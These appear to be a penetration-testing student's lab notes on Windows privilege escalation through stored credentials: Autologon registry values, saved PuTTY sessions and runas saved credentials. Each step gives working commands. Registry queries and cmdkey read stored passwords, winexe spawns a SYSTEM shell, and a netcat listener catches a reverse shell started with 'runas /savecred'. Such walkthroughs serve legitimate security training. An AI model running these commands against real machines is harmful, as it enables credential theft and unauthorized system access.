**Autologon**
1. WinPEAS will show you these
![](assets/Pasted%20image%2020260607140437.png)

2. verify manually by checking registry
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
![](assets/Pasted%20image%2020260607140800.png)

3. Use credentials with winexe to spawn a shell
```
# On Kali
winexe -U 'admin%password123' --system \\<IP> cmd.exe
```
- since they are an admin, we can use `--system` flag

![](assets/Pasted%20image%2020260607141105.png)


**PuTTY Sessions**
1. WinPEAS will show
![](assets/Pasted%20image%2020260607140500.png)

2. Verify manually by checking registry
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```
![](assets/Pasted%20image%2020260607140852.png)

3. Use credentials with winexe to spawn a shell
```
# On Kali
winexe -U 'admin%password123' --system \\<IP> cmd.exe
```
- since they are an admin, we can use `--system` flag

![](assets/Pasted%20image%2020260607141105.png)




**Saved Creds (runas)**
1. WinPEAS with cmd and windowscreds options
```
.\winPEASany.exe quiet cmd windowscreds > winpeas-cmd-windowscreds.txt
```
![](assets/Pasted%20image%2020260607141353.png)


2. confirm by running cmdkey
```
cmdkey /list
```
- if nothing else is showing up, can try restarting to see if this updates
![](assets/Pasted%20image%2020260607141604.png)


3. Start a listener, use runas with savecred to get shell
```
# On Kali
nc -lvnp <port>

# On Victim
runas /savecred /user:admin C:\privesc\reverse.exe
```
![](assets/Pasted%20image%2020260607141610.png)
![](assets/Pasted%20image%2020260607141615.png)

